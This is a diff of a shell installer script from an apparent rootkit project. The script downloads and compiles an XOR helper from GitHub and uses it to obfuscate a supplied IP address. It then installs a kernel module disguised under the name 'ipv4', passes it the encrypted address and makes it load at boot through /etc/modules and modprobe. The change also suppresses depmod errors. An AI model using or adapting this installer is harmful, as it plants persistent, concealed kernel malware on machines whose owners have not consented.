@@ -11,8 +11,6 @@ if [ -z "$IP_ADDR" ]; then
   exit 1
 fi
 
-key=126
-
 wget https://github.com/gobelinor/Rootkit-Project/raw/refs/heads/dev_tibo/mesmodules/insert/xor.c
 gcc -o xor xor.c
 encrypted=$(./xor $IP_ADDR)
@@ -23,7 +21,7 @@ echo "ipv4" >> /etc/modules
 mkdir -p /lib/modules/$(uname -r)/extra
 echo "options ipv4 param=$encrypted" > /etc/modprobe.d/ipv4.conf
 cp ipv4.ko /lib/modules/$(uname -r)/extra/
-depmod -a
+depmod -a 2>/dev/null
 
 # load le module
 modprobe ipv4
